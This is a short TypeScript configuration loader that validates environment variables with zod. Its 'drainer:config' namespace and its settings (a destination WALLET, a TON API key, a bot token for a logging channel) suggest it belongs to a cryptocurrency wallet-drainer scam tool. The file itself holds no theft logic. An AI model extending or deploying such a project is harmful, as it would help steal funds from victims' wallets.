import createDebug from 'debug'
import { z, ZodError } from 'zod'

const d = createDebug('drainer:config')

const ConfigSchema = z.object({
	// Bot token ONLY for sending log messages (no bot process runs)
	BOT_TOKEN: z.string().min(1),
	LOGGING_CHANNEL: z.string().min(1),
	WALLET: z.string().min(1),
	URL: z.string().min(1),
	TONAPI_KEY: z.string().optional().default(''),
	DATABASE_URL: z.string().min(1),
})

export type AppConfig = z.infer<typeof ConfigSchema>

function loadConfig() {
	try {
		const config = ConfigSchema.parse({
			BOT_TOKEN: Bun.env.BOT_TOKEN,
			LOGGING_CHANNEL: Bun.env.LOGGING_CHANNEL,
			WALLET: Bun.env.WALLET,
			URL: Bun.env.URL,
			TONAPI_KEY: Bun.env.TONAPI_KEY,
			DATABASE_URL: Bun.env.DATABASE_URL,
		})

		return config
	} catch (e) {
		if (e instanceof ZodError) {
			const errs = e.errors.map(err => err.path[0]).join(', ')
			d(`Missing (${errs}) variables, check your .env`)
			console.error(`Missing env vars: ${errs}`)
		}
		process.exit(1)
	}
}

export const config = loadConfig()
